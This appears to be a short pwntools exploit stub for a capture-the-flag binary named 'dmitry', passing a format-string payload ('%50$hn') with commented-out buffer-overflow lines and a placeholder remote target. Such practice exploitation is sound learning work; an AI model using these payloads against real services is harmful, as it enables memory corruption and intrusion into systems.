#!/usr/bin/env python3

from pwn import *

e = ELF("./dmitry")

context.terminal = ['tmux', 'splitw', '-h']
context.binary = e
context.encoding = 'utf-8'
debug_script = '''

'''

payload = '%50$hn'
#payload = b'A'*(128+16)
#payload += p64(e.symbols['printf']).strip(b'\x00')

def conn():
    if not args.REMOTE:
        if args.D:
            p = gdb.debug([e.path, payload])
        else:
            p = process([e.path, payload])
            # gdb.attach(p, gdbscript=debug_script)
    else:
        p = remote("addr", 1337)

    return p

p = conn()



p.interactive()


